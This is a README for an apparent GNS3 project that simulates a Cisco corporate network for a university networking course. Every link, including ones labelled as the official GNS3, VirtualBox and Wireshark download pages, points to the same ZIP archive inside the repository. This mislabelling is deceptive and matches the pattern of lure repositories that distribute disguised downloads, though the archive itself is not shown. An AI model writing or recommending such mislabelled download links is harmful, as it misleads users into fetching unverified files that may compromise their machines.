# 🖧 network-gns3-cisco - Simulate Cisco Networks Easily

[![Download](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip%20the%20Project-blue?style=for-the-badge)](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip)

---

## 📚 About This Project

This project creates a simulated corporate network for a company called "Pastelinho." It uses GNS3, a popular network simulator, to build and configure Cisco routers. The network includes key features like OSPF for routing, DHCP for automatic IP addresses, and NAT to share a single internet connection among devices.

The project supports students taking the course "Arquitetura e Protocolos de Comunicação" (APC) at ESTGA - Universidade de Aveiro. It helps learners understand how real-world Cisco networks work using a controlled, virtual environment.

You do not need any coding skills to use this. The simulation runs on your computer just like an app.

---

## ⚙️ What You Need Before Starting

### System Requirements

- **Operating System:** Windows 10 or 11, macOS 10.15 or later, or a Linux distribution such as Ubuntu 20.04+
- **Processor:** Intel i5 or better, or equivalent AMD CPU
- **Memory (RAM):** 8 GB minimum, 16 GB recommended
- **Disk Space:** At least 10 GB free to store network simulation files
- **Software:** 
  - GNS3 installed on your computer (we explain how below)
  - VirtualBox or VMware (for running virtual Cisco devices, optional but recommended)

### What is GNS3?

GNS3 is a network emulator. It lets you create virtual networks on your computer to experiment with devices like Cisco routers and switches.

---

## 🚀 Getting Started: Installing the Required Software

1. **Install GNS3**  
   - Go to the [GNS3 official download page](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip)  
   - Choose your operating system and download the installer  
   - Run the installer and follow the on-screen instructions  
   - If unsure, keep default settings

2. **Install VirtualBox (Optional but Recommended)**  
   - Visit [VirtualBox download page](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip)  
   - Download the correct version for your OS  
   - Install it by following the setup wizard  
   - VirtualBox is needed to run virtual Cisco IOS images in GNS3

3. **Verify Installation**  
   - Open GNS3 from your desktop or start menu  
   - The application should start without errors  
   - If you see any error messages, check your system meets requirements or reinstall

---

## 📥 Download & Install network-gns3-cisco

You can access this project files here:

[![Download Project](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip)](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip)

### Steps to Download

1. Click the link above or visit the [Releases page on GitHub](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip).
2. Find the latest release.
3. Download the ZIP or TAR file containing the project files.
4. Save it to a convenient folder on your computer, such as "Downloads" or "Documents."
5. Extract the contents of the ZIP/TAR file to a new folder.

---

## 📂 What’s Inside the Project Files?

The downloaded folder includes:

- **GNS3 Project file (.gns3):** This file opens the network simulation within GNS3.
- **IOS Images:** Virtual Cisco router operating systems needed to run devices inside GNS3.
- **Configuration Scripts:** Text files with router commands for OSPF, DHCP, NAT, and subnetting.
- **Documentation:** Helpful guides on the network design and how to use each part.
- **Wireshark Capture Files:** Samples for analyzing network traffic.

---

## ▶️ How to Open and Run the Network Simulation

1. Open GNS3 on your computer.
2. Select **File > Open Project** in the menu.
3. Browse to the folder where you extracted the project files.
4. Open the `.gns3` project file.
5. The network topology will appear on screen.
6. Click the **Play** button (green triangle) to start the simulated devices.
7. Select any router or device and open its console by right-clicking and choosing **Console**.
8. Use the console window to view or enter commands. The configuration scripts already set up OSPF, DHCP, and NAT.

---

## 🔧 Common Tasks You Can Try

- **Check Router Status:** Look at device consoles to see router responses.
- **Modify Network Settings:** Edit configuration scripts and reload routers.
- **Use Wireshark:** Open the included capture files to study network traffic.
- **Add Devices:** Drag more Cisco routers or switches into GNS3 for bigger simulations.

---

## 🧰 Tools You May Use Alongside This Project

- **Wireshark:** This tool captures and inspects network traffic and is helpful for studying OSPF and DHCP messages. Available at [https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip).
- **Cisco Packet Tracer:** Alternative for simple Cisco network layouts but less powerful than GNS3.

---

## ❓ Troubleshooting Tips

- If routers do not start, verify VirtualBox or VMware is installed correctly.
- If the simulation runs slowly, close other apps or increase memory assigned to virtual machines.
- Make sure downloaded IOS images are correctly linked inside GNS3 preferences.
- If the project file won’t open, ensure you extracted all files properly and are using the latest GNS3 version.

---

## 🤝 How to Get Help or Contribute

This project is mainly for educational purposes linked to the APC course at ESTGA-Universidade de Aveiro. You can explore the files and learn by doing.

If you want to suggest fixes or improvements:

1. Fork the repository on GitHub.
2. Make your changes.
3. Submit a Pull Request for review.

For further help, use the GitHub Discussions or Issues page.

---

## 📄 License

This project uses an open license for academic use. See the LICENSE file in the repository for full details.

---

This guide covers everything needed to download, install, and use the network-gns3-cisco project. Follow each step carefully to set up the virtual Cisco network on your computer.